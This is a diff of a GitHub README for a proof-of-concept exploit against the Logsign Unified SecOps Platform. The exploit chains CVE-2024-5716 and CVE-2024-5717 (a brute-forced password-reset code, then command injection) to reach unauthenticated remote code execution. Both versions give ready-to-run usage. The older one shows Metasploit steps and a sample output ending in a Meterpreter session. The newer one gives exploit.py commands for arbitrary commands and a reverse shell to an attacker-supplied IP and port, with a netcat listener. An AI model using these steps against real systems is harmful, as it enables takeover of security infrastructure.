@@ -1,104 +1,99 @@
-# Logsign Unified SecOps Platform: Detection CVE-2024-5716 to CVE-2024-5722 - Exploiting CVE-2024-5716 and CVE-2024-5717, Proof of Concept (PoC)
+# Logsign SIEM RCE Exploit (CVE-2024-5716 & CVE-2024-5717)
 
-## Explanation:
+This tool is a proof-of-concept (PoC) exploit that combines two critical vulnerabilities in the Logsign Unified SecOps Platform (SIEM) to achieve unauthenticated remote code execution (RCE).
 
-This repository contains Nuclei template for detecting multiple vulnerabilities in Logsign Unified SecOps Platform. The template are designed to identify the following vulnerabilities:
+## Description
 
-- **ZDI-CAN-24164 > CVE-2024-5716**: Logsign Unified SecOps Platform Authentication Bypass Vulnerability
-- **ZDI-CAN-24165 > CVE-2024-5717**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
-- **ZDI-CAN-24166 > CVE-2024-5718**: Logsign Unified SecOps Platform Missing Authentication Remote Code Execution Vulnerability
-- **ZDI-CAN-24167 > CVE-2024-5719**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
-- **ZDI-CAN-24168 > CVE-2024-5720**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
-- **ZDI-CAN-24169 > CVE-2024-5721**: Logsign Unified SecOps Platform Missing Authentication Remote Code Execution Vulnerability
-- **ZDI-CAN-24170 > CVE-2024-5722**: Logsign Unified SecOps Platform HTTP API Hard-coded Cryptographic Key Remote Code Execution Vulnerability
+The exploit chains two vulnerabilities:
 
-Notice: The API GET request performed in the detection section is closed on some servers. For this reason, you can manually visit the website and check the version from the homepage. This is important in order not to miss a finding.
+**CVE-2024-5716 (Authentication Bypass):**  
+A flaw in the password reset mechanism allows the 6-digit reset code to be brute-forced without rate limiting. This script uses multi-threading to quickly identify the reset code and reset the admin user's password.
 
-The metasploit exploit phase will be updated...
+**CVE-2024-5717 (Command Injection):**  
+Once logged in as an admin user, the `/api/settings/demo_mode` API endpoint fails to properly validate user input, allowing arbitrary command injection and execution on the target system.
+
+By combining these vulnerabilities, an attacker can gain full control over the target system.
+
+## Features
+
+- Automatically chains CVE-2024-5716 and CVE-2024-5717.
+- Resets the admin user's password to gain system access.
+- Supports three modes for remote code execution (RCE):
+  - **Default PoC**: Executes `id > /tmp/logsign_pwned.txt` on the target system.
+  - **Single Command Execution**: Runs a user-specified command.
+  - **Reverse Shell**: Establishes an interactive shell session to a specified IP and port.
+- Detailed logging for debugging with `--debug` mode.
+
+## Installation and Requirements
+
+**Clone the project files:**
+
+```
+bash
+git clone https://github.com/sevbandonmez/logsign-rce.git
+cd logsign-rce
+```
 
 Writeup: https://medium.com/@sevbandonmez/zero-day-review-critical-vulnerabilities-in-logsign-unified-secops-platform-versions-6-4-7-69bbec653b3a
 
+## Install the required Python library
+
+```pip install requests```
+
+
 ## Usage
-
-To use these template with Nuclei, follow the example steps below:
-
-### Clone the repository:
-
-```sh
-git clone https://github.com/sevbandonmez/Logsign-RCE.git
-cd Logsign-RCE
-```
-### Usage with Nuclei:
-
-**Single Target:**
-```sh
-nuclei -u https://target.com -t logsign-unauth-bypass-rce.yaml -nh
-```
-**Multiple Target:**
-```sh
-nuclei -l urls.txt -t logsign-unauth-bypass-rce.yaml -nh
-```
-**Sample Recon and Detection Process:**
-
-<p>
-  <img src="https://github.com/user-attachments/assets/a0759656-9cf9-44cf-9113-87c483303bb4" alt="Recon with Shodan" width="700"/>
-</p>
-<br>
-<p>
-  <img src="https://github.com/user-attachments/assets/5ea535f3-f9a8-43f3-a65d-3c40783cd8c9" alt="Detection with Nuclei" width="700"/>
-</p>
-
-### Usage with Metasploit
-```
-# Step 1: Copy the .rb file to the Metasploit modules directory
-sudo cp logsign-unauth-rce.rb /usr/share/metasploit-framework/modules/auxiliary/exploit/
-
-# Step 2: Start Metasploit
-msfconsole
-
-# Step 3: Load the module
-msf6 > use auxiliary/exploit/logsign-unauth-rce
-
-# Step 4: Set the required options
-msf6 auxiliary(exploit/logsign-unauth-rce) > set TARGETURI /
-msf6 auxiliary(exploit/logsign-unauth-rce) > set USERNAME admin
-msf6 auxiliary(exploit/logsign-unauth-rce) > set LHOST 0.0.0.0
-msf6 auxiliary(exploit/logsign-unauth-rce) > set LPORT 1337
-msf6 auxiliary(exploit/logsign-unauth-rce) > set RHOSTS 192.168.1.10
-msf6 auxiliary(exploit/logsign-unauth-rce) > set RPORT 443
-
-# Step 5: Run the exploit
-msf6 auxiliary(exploit/logsign-unauth-rce) > run
-
-[*] Resetting admin password using CVE-2024-5716...
-[*] Forget password request sent for user: admin
-[*] Successfully brute-forced reset code: 123456, verification code: 7890
-[*] Password successfully reset to: Hkdi2983jdlGfdLS
-[*] Successfully logged in with the new password. Session cookie: PHPSESSID=abcd1234...
-[*] CVE-2024-5717 Remote Code Execution process initiated...
-[*] Sending reverse shell payload...
-[*] Exploit completed, waiting for session...
-
-[*] Meterpreter session 1 opened (192.168.1.100:1337 -> 192.168.1.10:443) at 2024-08-12 12:34:56 +0000
-
-msf6 auxiliary(exploit/logsign-unauth-rce) >
+The script can be executed with various command-line arguments.
 
 ```
+usage: exploit.py [-h] -t TARGET [-rh REVERSE_HOST] [-rp REVERSE_PORT] [-c COMMAND] [-d]
 
-Many thanks to @mdisec (Mehmet Ince) for the security research and critical finding detections performed on this product.
+Logsign RCE Exploit Tool
 
-## Contributing
-Feel free to submit issues or pull requests if you find any bugs or have suggestions for improvements.
+options:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        Target URL (e.g., https://example.com:8443)
+  -rh REVERSE_HOST, --reverse-host REVERSE_HOST
+                        Reverse shell IP address
+  -rp REVERSE_PORT, --reverse-port REVERSE_PORT
+                        Reverse shell port
+  -c COMMAND, --command COMMAND
+                        Custom command to execute
+  -d, --debug           Enable debug logging
+```
 
-## License
-This project is licensed under the MIT License.
+## Example 1: Default PoC
+This mode creates a file /tmp/logsign_pwned.txt on the target system to prove the vulnerability.
 
-## Disclaimer
-This GitHub repository is intended solely for cybersecurity research and educational purposes. The tools, scripts, and information provided here are designed to help security professionals and researchers better understand and improve the security of computer systems and networks.
+```python3 exploit.py -t https://192.168.1.100```
 
-The repository owner, contributors, and GitHub do not endorse or support any illegal or unethical activities. Any misuse of the materials provided in this repository is strictly the responsibility of the user. The repository owner and contributors will not be held liable for any damage, loss, or legal consequences resulting from the use or misuse of the content in this repository.
+Check the file on the target system: cat /tmp/logsign_pwned.txt.Example 2: Single Command ExecutionRun a single command, such as whoami, on the target system:bash
 
-By using the content in this repository, you agree to use it responsibly and in compliance with all applicable laws and regulations.
+```python3 exploit.py -t https://192.168.1.100 -c "whoami"```
+
+## Example 3: Reverse Shell
+This mode provides an interactive command-line shell on the target system.
+
+**Step 1:* Start a listener on the attacker's machine using Netcat:bash**
+
+```nc -lvnp 4444```
+
+**Step 2:* Run the exploit, specifying your IP address and port:bash**
+
+```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444```
+
+If successful, a shell session will appear in your Netcat listener.
+
+## Debugging
+If the script fails or produces unexpected errors, enable detailed logging with the --debug flag:bash
+
+```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444 --debug```
+
+## Legal Disclaimer
+This tool is developed solely for authorized security testing and educational purposes. Unauthorized use of this tool for illegal activities is strictly prohibited. Any damage or legal consequences resulting from the use of this tool are the sole responsibility of the user. The developer is not liable for any misuse of this tool.
+
+## LICENSE
+This project is licensed under the MIT License. See the LICENSE file for details.
 
 ## References
 [Logsign Support](https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes)<br>
